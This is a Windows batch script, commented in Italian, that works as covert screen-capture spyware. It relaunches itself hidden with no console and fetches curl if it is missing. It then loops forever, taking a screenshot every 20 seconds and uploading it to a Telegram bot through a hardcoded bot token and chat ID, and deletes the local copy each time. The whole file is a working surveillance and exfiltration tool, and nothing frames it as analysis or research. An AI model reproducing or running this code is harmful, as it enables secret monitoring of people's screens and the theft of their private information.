@echo off
if "%1" == "hidden" goto :start

:: Riavvoca lo script in modalità nascosta (senza console)
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione Telegram
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "SCREENSHOT_PATH=%TEMP%\telegram_screenshot.png"

:: Verifica e installa curl se mancante
where curl >nul 2>&1 || (
    echo [+] Installazione curl...
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:loop
    :: Cattura screenshot
    powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 500; $img=[Windows.Forms.Clipboard]::GetImage(); if ($img) { $img.Save('%SCREENSHOT_PATH%', [Drawing.Imaging.ImageFormat]::Png) }"

    if exist "%SCREENSHOT_PATH%" (
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" -F chat_id=%CHAT_ID% -F photo=@"%SCREENSHOT_PATH%" >nul
        del "%SCREENSHOT_PATH%" >nul
    )

    :: Attesa 20 secondi
    ping -n 20 127.0.0.1 >nul
goto loop